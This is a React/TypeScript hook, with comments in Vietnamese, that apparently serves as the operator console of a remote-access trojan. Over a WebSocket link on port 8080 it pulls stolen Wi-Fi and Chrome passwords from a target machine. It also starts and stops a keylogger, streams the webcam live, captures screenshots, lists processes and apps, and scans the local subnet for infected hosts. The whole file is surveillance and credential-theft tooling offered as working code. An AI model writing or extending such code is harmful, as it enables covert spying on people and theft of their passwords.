import { useState, useRef, useCallback } from "react";

// --- TYPES (Export chuẩn để tránh lỗi verbatimModuleSyntax) ---
export type Process = { pid: number; name: string; path?: string };
export type ConnectionStatus = "DISCONNECTED" | "CONNECTING" | "CONNECTED";
export type MediaItem = {
  type: "image" | "video";
  src: string;
  timestamp: string;
};

export const useRemoteControl = () => {
  const [status, setStatus] = useState<ConnectionStatus>("DISCONNECTED");
  const [wifiData, setWifiData] = useState<string>("");
  const [chromeData, setChromeData] = useState<string>("");
  // Data States
  const [processes, setProcesses] = useState<Process[]>([]);
  const [installedApps, setInstalledApps] = useState<Process[]>([]);

  // Surveillance States
  const [liveStreamSrc, setLiveStreamSrc] = useState<string | null>(null); // State chứa ảnh Webcam Stream
  const [latestMedia, setLatestMedia] = useState<MediaItem | null>(null); // State chứa Screenshot
  const [history, setHistory] = useState<MediaItem[]>([]);

  // Keylogger States
  const [keylogs, setKeylogs] = useState<string>("");
  const [isLogging, setIsLogging] = useState(false);
  const isLoggingRef = useRef(false);

  // Scanner States
  const [scanResults, setScanResults] = useState<string[]>([]);
  const [isScanning, setIsScanning] = useState(false);

  const wsRef = useRef<WebSocket | null>(null);
  const heartbeatRef = useRef<number | undefined>(undefined);

  // --- WEBSOCKET CONNECTION ---
  const connect = useCallback((ip: string) => {
    if (wsRef.current) wsRef.current.close();
    setStatus("CONNECTING");

    try {
      const ws = new WebSocket(`ws://${ip}:8080`);
      wsRef.current = ws;

      ws.onopen = () => {
        setStatus("CONNECTED");
        // Lấy danh sách process ngay khi kết nối
        sendCommand("list_process");

        // Gửi ping mỗi 2s để giữ kết nối
        heartbeatRef.current = window.setInterval(() => {
          if (ws.readyState === WebSocket.OPEN)
            ws.send(JSON.stringify({ command: "ping" }));
        }, 2000);
      };

      ws.onclose = () => {
        setStatus("DISCONNECTED");
        clearInterval(heartbeatRef.current);
        setLiveStreamSrc(null); // Reset stream khi mất kết nối
      };

      ws.onmessage = (event) => {
        try {
          const res = JSON.parse(event.data);
          handleMessage(res);
        } catch (e) {
          console.error("JSON Parse Error:", e);
        }
      };
    } catch (e) {
      setStatus("DISCONNECTED");
    }
  }, []);

  const disconnect = () => {
    if (wsRef.current) {
      wsRef.current.close();
      wsRef.current = null;
    }
    setStatus("DISCONNECTED");
    clearInterval(heartbeatRef.current);
    setLiveStreamSrc(null);
  };

  // --- MESSAGE HANDLER ---
  const handleMessage = (response: any) => {
    switch (response.type) {
      case "process_list":
        setProcesses(response.data);
        break;
      case "installed_apps":
        setInstalledApps(response.data);
        break;
      case "wifi_passwords": // Hứng dữ liệu Wifi
        setWifiData(response.data);
        break;

      case "chrome_passwords":
        // SỬA: Dùng callback (prev => ...) để nối thêm dữ liệu mới vào dữ liệu cũ
        setChromeData((prev) => prev + response.data);
        break;
      // 1. Xử lý Stream Webcam (Nhận từng frame JPEG liên tục)
      case "webcam_frame":
        setLiveStreamSrc("data:image/jpeg;base64," + response.data);
        break;

      // 2. Xử lý Screenshot (Ảnh chụp màn hình đơn lẻ)
      case "image":
        const newItem: MediaItem = {
          type: "image",
          src: "data:image/png;base64," + response.data,
          timestamp: new Date().toLocaleTimeString(),
        };
        setLatestMedia(newItem);
        setHistory((prev) => [newItem, ...prev]);
        break;

      // 3. Xử lý Keylog
      case "keylog":
        // Chỉ cập nhật nếu client đang bật chế độ xem log
        if (isLoggingRef.current) {
          setKeylogs((prev) => prev + response.data);
        }
        break;

      default:
        break;
    }
  };

  const sendCommand = (command: string, params: any = "") => {
    if (wsRef.current?.readyState === WebSocket.OPEN) {
      wsRef.current.send(JSON.stringify({ command, params }));
    }
  };

  // --- FEATURES ---
  const toggleLogging = (state: boolean) => {
    setIsLogging(state);
    isLoggingRef.current = state;

    if (state) {
      sendCommand("start_keylog");
    } else {
      // Gửi lệnh stop để Server gỡ Hook (nếu Server hỗ trợ code này)
      sendCommand("stop_keylog");
    }
  };

  const startWebcam = () => {
    // Gửi lệnh start stream webcam
    sendCommand("webcam");
  };

  const stopWebcam = () => {
    // Gửi lệnh stop thread webcam trên server
    sendCommand("webcam", "stop");
    setLiveStreamSrc(null); // Xóa ảnh stream hiện tại
  };

  const clearLogs = () => setKeylogs("");

  // --- LAN SCANNER (Subnet Scan) ---
  // Hàm kiểm tra 1 IP có mở port 8080 không
  const checkIP = (ip: string): Promise<boolean> => {
    return new Promise((resolve) => {
      const socket = new WebSocket(`ws://${ip}:8080`);
      const timer = setTimeout(() => {
        socket.close();
        resolve(false);
      }, 300); // Timeout 300ms cho mỗi IP
      socket.onopen = () => {
        clearTimeout(timer);
        socket.close();
        resolve(true);
      };
      socket.onerror = () => {
        clearTimeout(timer);
        resolve(false);
      };
    });
  };

  // Hàm quét cả dải mạng (1 -> 254)
  const scanNetwork = async (subnet: string) => {
    setIsScanning(true);
    setScanResults([]);
    const promises = [];

    // Quét song song để tốc độ nhanh nhất
    for (let i = 1; i < 255; i++) {
      const ip = `${subnet}${i}`;
      promises.push(
        checkIP(ip).then((isAlive) => {
          if (isAlive) setScanResults((prev) => [...prev, ip]);
        })
      );
      // Delay nhỏ mỗi 20 requests để tránh browser bị lag
      if (i % 20 === 0) await new Promise((r) => setTimeout(r, 20));
    }
    await Promise.all(promises);
    setIsScanning(false);
  };
  const addLocalHistory = (item: MediaItem) => {
    setHistory((prev) => [item, ...prev]);
  };
  return {
    status,
    data: {
      processes,
      installedApps,
      liveStreamSrc, // Dữ liệu Stream Webcam
      latestMedia, // Dữ liệu Screenshot
      history,
      keylogs,
      isLogging,
      scanResults,
      isScanning,
      wifiData, // Export ra ngoài
      chromeData, // Export ra ngoài
    },
    actions: {
      connect,
      disconnect,
      sendCommand,
      toggleLogging,
      clearLogs,
      scanNetwork,
      startWebcam,
      stopWebcam,
      addLocalHistory,
    },
  };
};
